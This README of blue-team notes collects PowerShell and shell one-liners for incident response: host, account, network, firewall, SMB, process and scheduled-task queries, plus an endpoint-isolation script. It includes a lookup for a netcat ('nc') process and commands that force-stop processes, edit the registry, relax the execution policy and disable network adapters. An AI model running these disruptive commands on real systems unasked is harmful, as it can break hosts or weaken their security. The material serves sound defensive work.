<p align="center">
  <img width="450" height="450" src="https://user-images.githubusercontent.com/44196051/120006585-f0dc3c00-bfd0-11eb-98d9-da3eb59edbda.png">
</p>

# Blue Team Notes
A collection of one-liners, small scripts, and some useful tips for blue team work. 

The command line stuff tends to be Powershell, as these are the ones I forget the most. I've generally used these with [Velociraptor](https://www.velocidex.com), which can query thousands of endpoints at once.

I use _sysmon_ and _memetask_ as file or directory names in lieu of real file names, just replace the stupid names I've given with the files you actually need. 

I've tried not to use Powershell abbrevations or alias' without first writing out a verbose version of the commands. This is so no one feels fustrated that they aren't sure what a particular command is doing if it's their first time seeing the alias.

I've included screenshots where possible so you know what you're getting. Some screenshots will be from a Win machine, others may be from the Velociraptor GUI but they do the same thing as if you were on a host's powershell command line.

## Contact me
If you see a mistake, or have an easier way to run a command then you're welcome to hit me up on [Twitter](https://twitter.com/Purp1eW0lf) or commit an issue here. 

If you want to contribute I'd be grateful for the command and a screenshot. I'll of course add you as a contributor

## Table of Contents
- [Shell Style](#shell-style)
- [Powershell](#Powershell)
  * [OS Queries](#os-queries)
  * [Account Queries](#account-queries)
  * [Service Queries](#service-queries)
  * [Network Queries](#network-queries)
  * [Remoting Queries](#remoting-queries)
  * [Firewall Queries](#firewall-queries)
  * [SMB Queries](#smb-queries)
  * [Process Queries](#process-queries)
  * [Recurring Task Queries](#recurring-task-queries)
  * [File Queries](#file-queries)
  * [Reg Queries](#reg-queries)
  * [Driver Queries](#driver-queries)
  * [DLL Queries](#dll-queries)
  * [Log Queries](#log-queries)
  * [Powershell Tips](#powershell-tips)
- [Linux](#linux)
  * [Bash History](#bash-history)
  * [Grep and Ack](#grep-and-ack)
  * [Processes and Networks](#processes-and-networks)
  * [Files](#files)
  * [Bash Tips](#bash-tips)
- [Malware](#Malware)
  * [Rapid Malware Analaysis](#rapid-malware-analaysis)
  * [Process Monitor](#process-monitor)
  * [Hash Check Malware](#hash-check-malware)
  * [Decoding Powershell](#decoding-powershell)
- [SOC](#SOC)
  * [Sigma Converter](#sigma-converter)
  * [SOC Prime](#soc-prime)
- [Network Traffic](#network-traffic)
  * [TShark](#tshark)
  * [Extracting Stuff](#extracting-stuff)
- [Digital Forensics](#Digital-Forensics) 
  * [Volatility](#volatility)

---

As you scroll along, it's easy to lose orientation. Wherever you are in the Blue Team Notes, if you look to the top-left of the readme you'll see a little icon. This is a small table of contents, and it will help you figure out where you are, where you've been, and where you're going

![image](https://user-images.githubusercontent.com/44196051/122612244-b834fd00-d07a-11eb-9281-e4d93f4f6059.png)


---

# Shell Style

<details>
    <summary>section contents</summary>

  + [Give shell timestamp](#give-shell-timestamp)
    - [CMD](#cmd)
    - [Pwsh](#pwsh)
    - [Bash](#bash)

</details>

### Give shell timestamp
For screenshots during IR, I like to have the date, time, and sometimes the timezone in my shell
#### CMD
```bat
setx prompt $D$S$T$H$H$H$S$B$S$P$_--$g
:: all the H's are to backspace the stupid microsecond timestamp
:: $_ and --$g seperate the date/time and path from the actual shell
:: We make the use of the prompt command: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/prompt
:: setx is in fact the command line command to write variables to the registery
:: We are writing the prompt's new timestamp value in the cmd line into the reg so it stays, otherwise it would not stay in the cmdline when we closed it.
```
![image](https://user-images.githubusercontent.com/44196051/119978466-97b0e000-bfb1-11eb-83e1-022efba7dc96.png)

#### Pwsh
```powershell
###create a powershell profile, if it doesnt exist already
New-Item $Profile -ItemType file –Force
##open it in notepad to edit
function prompt{ "[$(Get-Date)]" +" | PS "+ "$(Get-Location) > "}
##risky move, need to tighten this up. Change your execution policy or it won't
#run the profile ps1
#run as powershell admin
Set-ExecutionPolicy RemoteSigned
```
![image](https://user-images.githubusercontent.com/44196051/119978226-486aaf80-bfb1-11eb-8e9e-52eabf2cde4c.png)

#### Bash
```bash
##open .bashrc
sudo nano .bashrc
#https://www.howtogeek.com/307701/how-to-customize-and-colorize-your-bash-prompt/
##date, time, colour, and parent+child directory only, and -> promptt
PS1='\[\033[00;35m\][`date  +"%d-%b-%y %T %Z"]` ${PWD#"${PWD%/*/*}/"}\n\[\033[01;36m\]-> \[\033[00;37m\]'
      ##begin purple  #year,month,day,time,timezone #show last 2 dir #next line, cyan,->prompt #back to normal white text
#restart the bash source
source ~/.bashrc
```
![image](https://user-images.githubusercontent.com/44196051/119981537-a7cabe80-bfb5-11eb-8b7e-1e5ba7f5ba99.png)
---
# Powershell

## OS Queries

<details>
    <summary>section contents</summary>

  + [Get Fully Qualified Domain Name](#get-fully-qualified-domain-name)
  + [Get OS and Pwsh info](#get-os-and-pwsh-info)
    - [Hardware Info](#hardware-info)
  + [Time info](#time-info)
    - [Human Readable](#human-readable)
    - [Machine comparable](#machine-comparable)
    - [Compare UTC time from Local time](#compare-utc-time-from-local-time)
  + [Update Info](#update-info)
    - [Get Patches](#get-patches)
    - [Manually check if patch has taken](#manually-check-if-patch-has-taken)
      * [Microsoft Support Page](#microsoft-support-page)
      * [On Host](#on-host)
      * [Discrepencies](#discrepencies)

</details>

## Get Fully Qualified Domain Name
```powershell
([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname

# Get just domain name
(Get-WmiObject -Class win32_computersystem).domain
```
  
### Get OS and Pwsh info
This will print out the hostname, the OS build info, and the powershell version
```powershell
$Bit = (get-wmiobject Win32_OperatingSystem).OSArchitecture ; 
$V = $host | select-object -property "Version" ; 
$Build = (Get-WmiObject -class Win32_OperatingSystem).Caption ; 
write-host "$env:computername is a $Bit $Build with Pwsh $V
```
![image](https://user-images.githubusercontent.com/44196051/120313634-2be0b700-c2d2-11eb-919f-5792169a1dba.png)

#### Hardware Info

If you want, you can get Hardware, BIOS, and Disk Space info of a machine

```powershell
#Get BIOS Info
gcim -ClassName Win32_BIOS | fl Manufacturer, Name, SerialNumber, Version;
#Get processor info
gcim -ClassName Win32_Processor | fl caption, Name, SocketDesignation;
#Computer Model
gcim -ClassName Win32_ComputerSystem | fl Manufacturer, Systemfamily, Model, SystemType
#Disk space in Gigs, as who wants bytes?
gcim  -ClassName Win32_LogicalDisk |
Select -Property DeviceID, DriveType, @{L='FreeSpaceGB';E={"{0:N2}" -f ($_.FreeSpace /1GB)}}, @{L="Capacity";E={"{0:N2}" -f ($_.Size/1GB)}} | fl

## Let's calculate an individual directory, C:\Sysmon, and compare with disk memory stats
$size = (gci c:\sysmon | measure Length -s).sum / 1Gb;
write-host " Sysmon Directory in Gigs: $size";
$free = gcim  -ClassName Win32_LogicalDisk | select @{L='FreeSpaceGB';E={"{0:N2}" -f ($_.FreeSpace /1GB)}};
echo "$free";
$cap = gcim  -ClassName Win32_LogicalDisk | select @{L="Capacity";E={"{0:N2}" -f ($_.Size/1GB)}} 
echo "$cap"
```
![image](https://user-images.githubusercontent.com/44196051/120922608-0c76cf00-c6c2-11eb-810b-288db6256bba.png)

### Time info
#### Human Readable
Get a time that's human readable
```powershell
Get-Date -UFormat "%a %Y-%b-%d %T UTC:%Z" 
```
![image](https://user-images.githubusercontent.com/44196051/120298372-f03df100-c2c1-11eb-92ab-d642c26133ab.png)

#### Machine comparable
This one is great for doing comparisons between two strings of time
```powershell
[Xml.XmlConvert]::ToString((Get-Date).ToUniversalTime(), [System.Xml.XmlDateTimeSerializationMode]::Utc) 
```
![image](https://user-images.githubusercontent.com/44196051/120314399-1e77fc80-c2d3-11eb-9a75-f9e677153d86.png)

#### Compare UTC time from Local time
```powershell
$Local = get-date;$UTC = (get-date).ToUniversalTime();
write-host "LocalTime is: $Local";write-host "UTC is: $UTC"
```
![image](https://user-images.githubusercontent.com/44196051/120301782-1fa22d00-c2c5-11eb-908f-763897fac25f.png)

### Update Info

#### Get Patches
Will show all patch IDs and their installation date
```powershell
get-hotfix|
select-object HotFixID,InstalledOn|
Sort-Object  -Descending -property InstalledOn|
format-table -autosize
```
![image](https://user-images.githubusercontent.com/44196051/120307390-d5bc4580-c2ca-11eb-8ffe-d1a835b1ce40.png)

Find why an update failed
```powershell
$Failures = gwmi -Class Win32_ReliabilityRecords;
$Failures | ? message -match 'failure'  | Select -ExpandProperty message 
```


#### Manually check if patch has taken
This happened to me during the March 2021 situation with Microsoft Exchange's ProxyLogon. The sysadmin swore blind they had patched the server, but neither `systeminfo` of `get-hotfix` was returning with the correct KB patch.

The manual workaround isn't too much ballache

##### Microsoft Support Page
First identify the ID number of the patch you want. And then find the dedicated Microsoft support page for it. 

For demonstration purposes, let's take `KB5001078` and it's [corresponding support page](https://support.microsoft.com/en-us/topic/kb5001078-servicing-stack-update-for-windows-10-version-1607-february-12-2021-3e19bfd1-7711-48a8-978b-ce3620ec6362). You'll be fine just googling the patch ID number.

![image](https://user-images.githubusercontent.com/44196051/120308871-7a8b5280-c2cc-11eb-850f-da46727a94ac.png)

Then click into the dropdown relevant to your machine. 
![image](https://user-images.githubusercontent.com/44196051/120309734-7f043b00-c2cd-11eb-9cf6-3a7ca6be6691.png)

Here you can see the files that are included in a particular update. The task now is to pick a handful of the patch-files and compare your host machine. See if these files exist too, and if they do do they have similar / same dates on the host as they do in the Microsoft patch list?

##### On Host
Let us now assume you don't know the path to this file on your host machine. You will have to recursively search for the file location. It's a fair bet that the file will be in `C:\Windows\` (but not always), so lets' recursively look for `EventsInstaller.dll`

```powershell
$file = 'EventsInstaller.dll'; $directory = 'C:\windows' ;
gci -Path $directory -Filter $file -Recurse -force|
sort-object  -descending -property LastWriteTimeUtc | fl *
```
We'll get a lot of information here, but we're really concerned with is the section around the various *times*. As we sort by the `LastWriteTimeUtc`, the top result should in theory be the latest file of that name...but this is not always true.

![image](https://user-images.githubusercontent.com/44196051/120312109-37cb7980-c2d0-11eb-95e2-8655cd89f9cc.png)

##### Discrepencies
I've noticed that sometimes there is a couple days discrepency between dates. 

![image](https://user-images.githubusercontent.com/44196051/120313127-7d3c7680-c2d1-11eb-8941-e96575a63138.png)

For example in our screenshot, on the left Microsoft's support page supposes the `EvenntsInstaller.dll` was written on the 13th January 2021. And yet our host on the right side of the screenshot comes up as the 14th January 2021. This is fine though, you've got that file don't sweat it. 

---

## Account Queries

<details>
    <summary>section contents</summary>

  + [Users recently created in Active Directory](#users-recently-created-in-active-directory)
  + [Hone in on suspicious user](#hone-in-on-suspicious-user)
  + [Retrieve local user accounts that are enabled](#retrieve-local-user-accounts-that-are-enabled)
  + [Find all users currently logged in](#find-all-users-currently-logged-in)
  + [Computer / Machine Accounts](#computer---machine-accounts)
    - [Show machine accounts that are apart of interesting groups.](#show-machine-accounts-that-are-apart-of-interesting-groups)
    - [Reset password for a machine account.](#reset-password-for-a-machine-account)

</details>

### Users recently created in Active Directory
*Run on a Domain Controller*.

Change the AddDays field to more or less days if you want. Right now set to seven days.

The 'when Created' field is great for noticing some inconsistencies. For example, how often are users created at 2am?
```powershell
import-module ActiveDirectory;
$When = ((Get-Date).AddDays(-7)).Date; Get-ADUser -Filter {whenCreated -ge $When} -Properties whenCreated
```
![image](https://user-images.githubusercontent.com/44196051/120461945-614cd980-c392-11eb-8352-2141ee42efdf.png)

### Hone in on suspicious user
You can use the `SamAccountName` above to filter
```powershell
import-module ActiveDirectory;
Get-ADUser -Identity HamBurglar -Properties *
```
![image](https://user-images.githubusercontent.com/44196051/120328655-f1334a80-c2e2-11eb-97da-653553b7c01a.png)

### Retrieve local user accounts that are enabled
```powershell
 Get-LocalUser | ? Enabled -eq "True"
```
![image](https://user-images.githubusercontent.com/44196051/120561793-216f0c00-c3fd-11eb-9738-76e778c79763.png)

### Find all users currently logged in
```powershell
Get-CimInstance -classname win32_computersystem |
select username, domain, DNSHostName | ft -autosize
```
![image](https://user-images.githubusercontent.com/44196051/120562311-1072ca80-c3fe-11eb-995f-9d42d1c451d6.png)


### Computer / Machine Accounts
Adversaries like to use Machine accounts (accounts that have a $) as these often are overpowered AND fly under the defenders' radar

#### Show machine accounts that are apart of interesting groups. 
There may be misconfigurations that an adversary could take advantadge. 
```powershell
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
```
![image](https://user-images.githubusercontent.com/44196051/120346984-cac9db00-c2f3-11eb-8ab0-1112aa2183a9.png)

#### Reset password for a machine account. 
Good for depriving adversary of pass they may have got. 
Also good for re-establishing trust if machine is kicked out of domain trust for reasons(?)

```powershell
Reset-ComputerMachinePassword
```
---

## Service Queries

<details>
    <summary>section contents</summary>

  + [Show Services & Service Accounts](#show-services---service-accounts)
  + [Hone in on specific Service](#hone-in-on-specific-service)
  + [Kill a service](#kill-a-service)
  
</details>

### Show Services & Service Accounts

Let's get all the services and sort by what's running
```powershell
get-service|Select Name,DisplayName,Status|
sort status -descending | ft -Property * -AutoSize|
Out-String -Width 4096
```
![image](https://user-images.githubusercontent.com/44196051/120901027-354e8400-c630-11eb-8ac8-869864349cf5.png)

Utilise Get-WmiObject(gwmi) to show all service accounts on a machine, and then sort to show the running accounts first and the stopped accounts second.

StartName is the name of the Service Account btw

```powershell
 gwmi -Class Win32_Service|
 select-object -Property Name, StartName, state, startmode, Caption, ProcessId |
 sort-object -property state
```
![image](https://user-images.githubusercontent.com/44196051/120340649-23967500-c2ee-11eb-892b-0c6626072d8c.png)

### Hone in on specific Service
If a specific service catches your eye, you can get all the info for it.  Because the single and double qoutes are important to getting this right, I find it easier to just put the DisplayName of the service I want as a variable, as I tend to fuck up the displayname filter bit

```powershell
$Name = "eventlog"; 
gwmi -Class Win32_Service -Filter "Name = '$Name' " | fl *

#or this, but you get less information compared to the one about tbh
get-service -name "eventlog" | fl *   
```
![image](https://user-images.githubusercontent.com/44196051/120341774-14fc8d80-c2ef-11eb-8b1d-31db7620b7cb.png)


### Kill a service
``` powershell
Get-Service -DisplayName "meme_service" | Stop-Service -Force -Confirm:$false -verbose
```

---

## Network Queries

<details>
    <summary>section contents</summary>

  + [Find internet established connections, and sort by time established](#find-internet-established-connections--and-sort-by-time-established)
  + [Sort remote IP connections, and then unique them](#sort-remote-ip-connections--and-then-unique-them)
    - [Hone in on a suspicious IP](#hone-in-on-a-suspicious-ip)
  + [Show UDP connections](#show-udp-connections)
  + [Kill a connection](#kill-a-connection)
  + [Check Hosts file](#check-Hosts-file)
    - [Check Host file Time](#Check-Host-file-time)
  + [DNS Cache](#dns-cache)
    - [Investigate DNS](#investigate-dns)
  + [IPv6](#ipv6)
    - [Disable Priority Treatment of IPv6](#Disable-Priority-Treatment-of-IPv6)

</details>

### Find internet established connections, and sort by time established
You can always sort by whatever value you want really. CreationTime is just an example
```powershell
Get-NetTCPConnection -AppliedSetting Internet |
select-object -property remoteaddress, remoteport, creationtime |
Sort-Object -Property creationtime |
format-table -autosize
```
![image](https://user-images.githubusercontent.com/44196051/120314725-73b40e00-c2d3-11eb-9dbf-3b0582a9b2d0.png)

### Sort remote IP connections, and then unique them
This really makes strange IPs stand out
```powershell
(Get-NetTCPConnection).remoteaddress | Sort-Object -Unique 
```
![image](https://user-images.githubusercontent.com/44196051/120314835-8dedec00-c2d3-11eb-8469-e658eb743364.png)

#### Hone in on a suspicious IP
If you see suspicious IP address in any of the above, then I would hone in on it
```powershell
Get-NetTCPConnection |
? {($_.RemoteAddress -eq "1.2.3.4")} |
select-object -property state, creationtime, localport,remoteport | ft -autosize

## can do this as well 
 Get-NetTCPConnection -remoteaddress 0.0.0.0 |
 select state, creationtime, localport,remoteport | ft -autosize
 ```
 ![image](https://user-images.githubusercontent.com/44196051/120313809-68141780-c2d2-11eb-85ac-5e369715f8ed.png)

### Show UDP connections
You can generally filter pwsh UDP the way we did the above TCP
```powershell
 Get-NetUDPEndpoint | select local*,creationtime, remote* | ft -autosize
```
![image](https://user-images.githubusercontent.com/44196051/120562989-7744b380-c3ff-11eb-963b-443cc9176643.png)


### Kill a connection
There's probably a better way to do this. But essentially, get the tcp connection that has the specific remote IPv4/6 you want to kill. It will collect the OwningProcess. From here, get-process then filters for those owningprocess ID numbers. And then it will stop said process. Bit clunky
``` powershell
stop-process -verbose -force -Confirm:$false (Get-Process -Id (Get-NetTCPConnection -RemoteAddress "1.2.3.4" ).OwningProcess)
```

### Check Hosts file
Some malware may attempt DNS hijacking, and alter your Hosts file
```powershell
gc -tail 4 "C:\Windows\System32\Drivers\etc\hosts"

#the above gets the most important bit of the hosts file. If you want more, try this:
gc "C:\Windows\System32\Drivers\etc\hosts"
```
#### Check Host file Time
Don't trust timestamps....however, may be interesting to see if altered recently
```powershell
gci "C:\Windows\System32\Drivers\etc\hosts" | fl *Time* 

```
![image](https://user-images.githubusercontent.com/44196051/120916488-d4f82a80-c6a1-11eb-8551-ac495ce2de68.png)

### DNS Cache

Collect the DNS cache on an endpoint. Good for catching any sneaky communication or sometimes even DNS C2

```powershell
Get-DnsClientCache | out-string -width 1000
```

![image](https://user-images.githubusercontent.com/44196051/121901947-c99aa400-cd1e-11eb-8454-093c54dd2086.png)

#### Investigate DNS

The above command will likely return a lot of results you don't really need about the communication between 'trusted' endpoints and servers. We can filter these 'trusted' hostnames out with regex, until we're left with less common results. 

On the second line of the below code, change up and insert the regex that will filter out your machines. For example, if your machines are generally called WrkSt1001.corp.local, or ServStFAX.corp.local, you can regex out that first poriton so it will exclude any and all machines that share this - so `workst|servst` would do the job. You don't need to wildcard here.

Be careful though. If you are too generic and liberal, you may end up filtering out malicious and important results. It's bettter to be a bit specific, and drill down further to amake sure you aren't filtering out important info. So for example, I wouldn't suggest filtering out short combos of letters or numbers `ae|ou|34|`

```powershell
Get-DnsClientCache | 
? Entry -NotMatch "workst|servst|memes|kerb|ws|ocsp" |
out-string -width 1000  
```

If there's an IP you're sus of, you can always take it to [WHOIS](https://who.is/) or [VirusTotal](https://www.virustotal.com/gui/home/search), as well see for other instances it appears in your network and what's up to whilst it's interacting there.

### IPv6

Since Windows Vitsa, the Windows OS prioritises IPv6 over IPv4. This lends itself to man-in-the-middle attacks, you can find some more info on exploitation [here](https://www.youtube.com/watch?v=zzbIuslB58c)

Get IPv6 addresses and networks

```powershell
Get-NetIPAddress -AddressFamily IPv6  | ft Interfacealias, IPv6Address
```
![image](https://user-images.githubusercontent.com/44196051/121316010-c8bdd880-c900-11eb-92d5-740b38a98a35.png)

#### Disable Priority Treatment of IPv6

You probably don't want to switch IPv6 straight off. And if you DO want to, then it's probably better at a DHCP level. But what we can do is change how the OS will prioritise the IPv6 over IPv4.

```powershell
#check if machine prioritises IPv6
ping $env:COMPUTERNAME -n 4 # if this returns an IPv6, the machine prioritises this over IPv4

#Reg changes to de-prioritise IPv6
New-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value 0x20 -PropertyType “DWord”

#If this reg already exists and has values, change the value
Set-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value 0x20

#you need to restart the computer for this to take affect
#Restart-Computer
```
![image](https://user-images.githubusercontent.com/44196051/121317107-e2135480-c901-11eb-9832-5930a94f80ac.png
)


## Remoting Queries

<details>
    <summary>section contents</summary>

  + [Powershell Remoting](#powershell-remoting)
    - [Remoting Permissions](#remoting-permissions)
    - [Check Constrained Language](#check-constrained-language)
  + [RDP Settings](#rdp-settings)
  + [Check Certificates](#check-certificates)
    - [Certificate Dates](#certificate-dates)
  
</details>

### Powershell Remoting

Get Powershell sessions created

```powershell
Get-PSSession
```

#### Remoting Permissions
```powershell
Get-PSSessionConfiguration | 
fl Name, PSVersion, Permission
```

![image](https://user-images.githubusercontent.com/44196051/121309128-b8eec600-c8f9-11eb-955b-99c70cb30dea.png)


### Check Constrained Language

To be honest, constrained language mode in Powershell can be trivally easy to mitigate for an adversary. And it's difficult to implement persistently. But anyway. You can use this quick variable to confirm if a machine has a constrained language mode for pwsh.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

![image](https://user-images.githubusercontent.com/44196051/121309801-8b564c80-c8fa-11eb-9955-15bf209844e3.png)

### RDP settings

You can check if RDP capability is permissioned on an endpoint
```powershell
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0){write-host "RDP Enabled" } else { echo "RDP Disabled" }
```

If you want to block RDP
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 1
#Firewall it out too
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
```


### Check Certificates

```powershell
gci "cert:\" -recurse | fl FriendlyName, Subject, Not* 
```

![image](https://user-images.githubusercontent.com/44196051/121305446-7d51fd00-c8f5-11eb-918b-da6b7f09d2eb.png)

#### Certificate Dates

You will be dissapointed how many certificates are expired but still in use. Use the `-ExpiringInDays` flag

```powershell
 gci "cert:\*" -recurse -ExpiringInDays 0 | fl FriendlyName, Subject, Not*  
 
```

## Firewall Queries

<details>
    <summary>section contents</summary>

  + [Retreieve Firewall profile names](#retreieve-firewall-profile-names)
    - [Retrieve rules of specific profile](#retrieve-rules-of-specific-profile)
  + [Filter all firewall rules](#filter-all-firewall-rules)
  + [Code Red](#code-red)
    - [Isolate Endpoint](#isolate-endpoint)

</details>

### Retrieve Firewall profile names
```powershell
(Get-NetFirewallProfile).name
```
![image](https://user-images.githubusercontent.com/44196051/120560271-53cb3a00-c3fa-11eb-83f7-f60f431d0c7b.png)

#### Retrieve rules of specific profile
Not likely to be too useful getting all of this information raw, so add plenty of filters
```powershell
Get-NetFirewallProfile -Name Public | Get-NetFirewallRule
##filtering it to only show rules that are actually enabled
Get-NetFirewallProfile -Name Public | Get-NetFirewallRule | ? Enabled -eq "true"
```
![image](https://user-images.githubusercontent.com/44196051/120560766-3cd91780-c3fb-11eb-9781-bf933c4b0efa.png)

### Filter all firewall rules
```powershell

#show firewall rules that are enabled
Get-NetFirewallRule | ? Enabled -eq "true"
#will show rules that are not enabled
Get-NetFirewallRule | ? Enabled -notmatch "true"

##show firewall rules that pertain to inbound
Get-NetFirewallRule | ? direction -eq "inbound"
#or outbound
Get-NetFirewallRule | ? direction -eq "outbound"

##stack these filters
Get-NetFirewallRule | where {($_.Enabled -eq "true" -and $_.Direction -eq "inbound")}
#or just use the built in flags lol
Get-NetFirewallRule -Enabled True -Direction Inbound
```

### Code Red

#### Isolate Endpoint
Disconnect network adaptor, firewall the fuck out of an endpoint, and display warning box

This is a code-red command. Used to isolate a machine in an emergency.

In the penultimate and final line, you can change the text and title that will pop up for the user

```powershell
New-NetFirewallRule -DisplayName "Block all outbound traffic" -Direction Outbound -Action Block | out-null; 
New-NetFirewallRule -DisplayName "Block all inbound traffic" -Direction Inbound -Action Block | out-null; 
$adapter = Get-NetAdapter|foreach { $_.Name } ; Disable-NetAdapter -Name "$adapter" -Confirm:$false; 
Add-Type -AssemblyName PresentationCore,PresentationFramework; 
[System.Windows.MessageBox]::Show('Your Computer has been Disconnected from the Internet for Security Issues. Please do not try to re-connect to the internet. Contact Security Helpdesk Desk ',' CompanyNameHere Security Alert',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Information)
```
![image](https://user-images.githubusercontent.com/44196051/119979598-0e9aa880-bfb3-11eb-9882-08d02a0d3026.png)

---


---

## SMB Queries

<details>
    <summary>section contents</summary>

  + [List Shares](#list-shares)
  + [List client-to-server SMB Connections](#list-client-to-server-smb-connections)
  + [Remove an SMB Share](#remove-an-smb-share)

</details>

### List Shares
```powershell
  Get-SMBShare
```
![image](https://user-images.githubusercontent.com/44196051/120796972-5c735b80-c533-11eb-8502-888440c21e94.png)

### List client-to-server SMB Connections
Dialect just means verison. SMB3, SMB2 etc

``` powershell
Get-SmbConnection
 
#just show SMB Versions being used. Great for enumeration flaws in enviro - i.e, smb1 being used somewhere
Get-SmbConnection |
select Dialect, Servername, Sharename | sort Dialect   
```
![image](https://user-images.githubusercontent.com/44196051/120797516-0eab2300-c534-11eb-9568-7753ad58cdf7.png)

![image](https://user-images.githubusercontent.com/44196051/120797860-795c5e80-c534-11eb-87fb-cc02ca70b4b0.png)

### Remove an SMB Share
```powershell
Remove-SmbShare -Name MaliciousShare -Confirm:$false -verbose
```

---

## Process Queries

<details>
    <summary>section contents</summary>
  
  + [Processes and TCP Connections](#processes-and-tcp-connections)
  + [Show all processes and their associated user](#show-all-processes-and-their-associated-user)
  + [Get specific info about the full path binary that a process is running](#get-specific-info-about-the-full-path-binary-that-a-process-is-running)
  + [Is a specific process a running on a machine or not](#is-a-specific-process-a-running-on-a-machine-or-not)
  + [Get process hash](#get-process-hash)
  + [Show all DLLs loaded with a process](#show-all-dlls-loaded-with-a-process)
  + [Identify process CPU usage](#identify-process-cpu-usage)
    - [Sort by least CPU-intensive processes](#sort-by-least-cpu-intensive-processes)
  + [Stop a Process](#stop-a-process)
  
</details>

### Processes and TCP Connections
Collect the owningprocess of the TCP connections, and then ask get-process to filter and show processes that make network communications

```powershell
Get-Process -Id (Get-NetTCPConnection).OwningProcess
```
![image](https://user-images.githubusercontent.com/44196051/120337318-1cba3300-c2eb-11eb-8444-0b54e67f6285.png)

### Show all processes and their associated user
```powershell
get-process * -Includeusername
```
![image](https://user-images.githubusercontent.com/44196051/120329122-70288300-c2e3-11eb-95ef-276ffd556acd.png)

### Get specific info about the full path binary that a process is running
```powershell
gwmi win32_process | Select Name,ProcessID,@{n='Owner';e={$_.GetOwner().User}},CommandLine | 
sort name | ft -wrap -autosize | out-string
```

![image](https://user-images.githubusercontent.com/44196051/120901193-4350d480-c631-11eb-81c4-41c832d064de.png)


### Get specific info a process is running
```powershell
get-process -name "nc" | ft Name, Id, Path,StartTime,Includeusername -autosize 
```
![Images](https://user-images.githubusercontent.com/44196051/120901392-78a9f200-c632-11eb-84df-2168226375a7.png)

### Is a specific process a running on a machine or not
```powershell
$process = "memes";
if (ps |  where-object ProcessName -Match "$process") {Write-Host "$process successfully installed on " -NoNewline ; hostname} else {write-host "$process absent from " -NoNewline ; hostname}
```

Example of process that is absent
![image](https://user-images.githubusercontent.com/44196051/119976215-b1045d00-bfae-11eb-806c-49a62f5aab15.png)
Example of process that is present
![image](https://user-images.githubusercontent.com/44196051/119976374-ea3ccd00-bfae-11eb-94cd-37ed4233564d.png)

### Get process hash
Great to make malicious process stand out. If you want a different Algorithm, just change it after `-Algorithm` to something like `sha256` 
```powershell
foreach ($proc in Get-Process | select path -Unique){try
{ Get-FileHash $proc.path -Algorithm sha256 -ErrorAction stop |
ft hash, path -autosize -HideTableHeaders | out-string -width 800 }catch{}}
```
![image](https://user-images.githubusercontent.com/44196051/119976802-8cf54b80-bfaf-11eb-82de-1a92bbcae4f9.png)

### Show all DLLs loaded with a process
```powershell
get-process -name "memestask" -module 
```
![image](https://user-images.githubusercontent.com/44196051/119976958-bdd58080-bfaf-11eb-8833-7fdf78045967.png)

Alternatively, pipe `|fl` and it will give a granularity to the DLLs

![image](https://user-images.githubusercontent.com/44196051/119977057-db0a4f00-bfaf-11eb-97ce-1e762088de8e.png)

### Identify process CPU usage 
```powershell
 (Get-Process -name "googleupdate").CPU | fl 
```
![image](https://user-images.githubusercontent.com/44196051/119982198-756d9100-bfb6-11eb-8645-e41cf46116b3.png)

I get mixed results with this command but it's supposed to give the percent of CPU usage. I need to work on this, but I'm putting it in here so the world may bare wittness to my smooth brain. 
```powershell
$ProcessName = "symon" ; 
$ProcessName = (Get-Process -Id $ProcessPID).Name; 
$CpuCores = (Get-WMIObject Win32_ComputerSystem).NumberOfLogicalProcessors; 
$Samples = (Get-Counter "\Process($Processname*)\% Processor Time").CounterSamples; 
$Samples | Select `InstanceName,@{Name="CPU %";Expression={[Decimal]::Round(($_.CookedValue / $CpuCores), 2)}}
```
![image](https://user-images.githubusercontent.com/44196051/119982326-9a620400-bfb6-11eb-9a66-ad5a5661bc8a.png)

### Sort by least CPU-intensive processes

Right now will show the lower cpu-using proccesses...useful as malicious process probably won't be as big a CPU as Chrome, for example. But change first line to `Sort CPU -descending` if you want to see the chungus processes first

```powershell
gps | Sort CPU |
Select -Property ProcessName, CPU, ID, StartTime | 
ft -autosize -wrap | out-string -width 800
```

![image](https://user-images.githubusercontent.com/44196051/120922422-f87e9d80-c6c0-11eb-8901-77ba9c95432c.png)

### Stop a Process
```powershell
Get-Process -Name "memeprocess" | Stop-Process -Force -Confirm:$false -verbose
```

---

## Recurring Task Queries

<details>
    <summary>section contents</summary>
  
  + [Get scheduled tasks](#get-scheduled-tasks)
    - [Get a specific schtask](#get-a-specific-schtask)
    - [To find the commands a task is running](#to-find-the-commands-a-task-is-running)
    - [To stop the task](#to-stop-the-task)
  + [Show what programs run at startup](#show-what-programs-run-at-startup)
  + [Scheduled Jobs](#scheduled-jobs)
    - [Find out what scheduled jobs are on the machine](#find-out-what-scheduled-jobs-are-on-the-machine)
    - [Get detail behind scheduled jobs](#get-detail-behind-scheduled-jobs)
    - [Kill job](#kill-job)
  + [Hunt WMI Persistence](#hunt-wmi-persistence)
    - [Removing it](#removing-it)
    - [A note on CIM](#a-note-on-cim)

</details>

### Get scheduled tasks
Identify the user behind a command too. Great at catching out malicious schtasks that perhaps are imitating names, or a process name
```powershell
schtasks /query /FO CSV /v | convertfrom-csv |
where { $_.TaskName -ne "TaskName" } |
select "TaskName","Run As User", Author, "Task to Run"| 
fl | out-string
```
![image](https://user-images.githubusercontent.com/44196051/120901651-27026700-c634-11eb-9aa2-6a4812450ac2.png)

#### Get a specific schtask
```powershell
Get-ScheduledTask -Taskname "wifi*" | fl *
```
![image](https://user-images.githubusercontent.com/44196051/120563312-2d100200-c400-11eb-8f47-cd3e76df4165.png)

#### To find the commands a task is running
Great one liner to find exactly WHAT a regular task is doing
```powershell
$task = Get-ScheduledTask | where TaskName -EQ "meme task"; 
$task.Actions
```
![image](https://user-images.githubusercontent.com/44196051/119979087-5f5dd180-bfb2-11eb-9d4d-bbbf66043535.png)

